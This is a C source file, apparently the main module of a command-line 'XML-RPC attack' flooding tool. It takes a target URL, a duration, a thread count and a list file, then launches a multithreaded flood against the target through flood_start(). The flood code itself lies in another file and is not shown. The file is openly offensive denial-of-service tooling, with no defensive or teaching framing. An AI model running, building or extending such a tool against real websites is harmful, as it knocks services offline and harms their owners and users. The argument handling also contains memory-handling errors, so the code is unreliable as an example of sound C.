/**
 * Copyright (c) 2016 Copyright Holder All Rights Reserved.
 * https://www.youtube.com/watch?v=hn7OqnInzQE
*/

#include "xml.h"
#include "core.h"
#include "flood.h"
#include "utils.h"
#include "vector.h"

#include <ctype.h>
#include <signal.h>

void core_handle_exit(int caught_sig) {
  signal(caught_sig, SIG_IGN);
  printf("\nAre you sure you want to exit? [y/n]: ");
  char user_select = tolower(getc(stdin));
  if(user_select == 'y') {
    exit(EXIT_SUCCESS);
  }
}

void core_set_title() {
  char title_hdr[] = {
    0x1b, 0x5D, 0x30, 0x3B, 0x0
  };
  char title_pad[] = {
    0x07, 0x0
  };

  // No, I'm not hardcoding the value
  if(dprintf(STDOUT_FILENO, "%sXML-RPC attack%s", title_hdr, title_pad) == 0) {
    return;
  }
  fflush(stdout);
}

void core_display_help() {
  const char* flag_usage[] = {
    "-w <target - http://google.com/>",
    "-d <time - 20>",
    "-t <threads - 50>",
    "-f <list list.txt>"
  };

  printf("Usage: ./bin <flags>\n");
  size_t flag_sz = (sizeof(flag_usage) / sizeof(flag_usage[0]));
  for (size_t i = 0; i < flag_sz; i++) {
    printf("%s\n", flag_usage[i]);
  }
  exit(EXIT_SUCCESS);
}

void core_parse_args(args_t* args, const char* arg_key, const char* arg_val) {
  size_t arg_val_sz = strlen(arg_val);
  char arg_key_single = arg_key[1];

  if(arg_val_sz <= MAX_PARAM_SZ) {
    switch(arg_key_single) {
      case 't':
      {
        if(utils_is_int(arg_val)) {
          args->threads = atoi(arg_val);
        } else {
          core_display_help();
        }
        break;
      }

      case 'f':
      {
        if(utils_file_check(arg_val)) {
          void* location_ptr = (void*)args->list_loc;
          args->list_loc = realloc(location_ptr, strlen(arg_val));
          args->list_loc = arg_val;
        } else {
          printf("Error, %s does not exist.\n\n", arg_val);
          core_display_help();
        }
        break;
      }

      case 'd':
      {
        if(utils_is_int(arg_val)) {
          args->duration = atoi(arg_val);
        } else {
          core_display_help();
        }
        break;
      }

      case 'w':
      {
        void* target_ptr = (void*)args->target;
        args->target = realloc(target_ptr, strlen(arg_val));
        args->target = arg_val;
        break;
      }
    }
  }
}

void core_setup_struct(args_t* args) {
  memset(args, 0, sizeof(args_t));
  args->list_loc = calloc(MAX_PARAM_SZ, sizeof(char));
  args->target = calloc(MAX_PARAM_SZ, sizeof(char));
}

int main(int argc, const char* argv[]) {
  sighandler_t catch_exit = signal(SIGINT, core_handle_exit);
  #ifdef DEBUG
    if(catch_exit == SIG_ERR) {
      printf("Could not hook SIGINT\n");
    }
  #endif

  core_set_title();

  args_t* args = malloc(sizeof(args_t));
  core_setup_struct(args);

  for (size_t i = 0; i < argc; i++) {
    int next_index = (i + 1);
    if(next_index <= (argc - 1)) {
      core_parse_args(args, argv[i], argv[next_index]);
    }
  }

  if(strlen(args->target) == 0 || args->duration <= 0 || args->threads <= 0) {
    core_display_help();
  }

  utils_list_push(args->list_loc);

  #ifdef DEBUG
    printf("List: %s, time: %lu, threads: %lu, target: %s\n", args->list_loc, args->duration, args->threads, args->target);
  #endif

  attack_t* attack = malloc(sizeof(attack_t));
  attack->target = (char*)args->target;
  attack->duration = args->duration;
  attack->threads = args->threads;
  flood_start(attack);

  #ifdef DEBUG
    printf("Cleaning up..\n");
  #endif

  vector_destroy();
  free(attack);
  free(args);
  return 0;
}
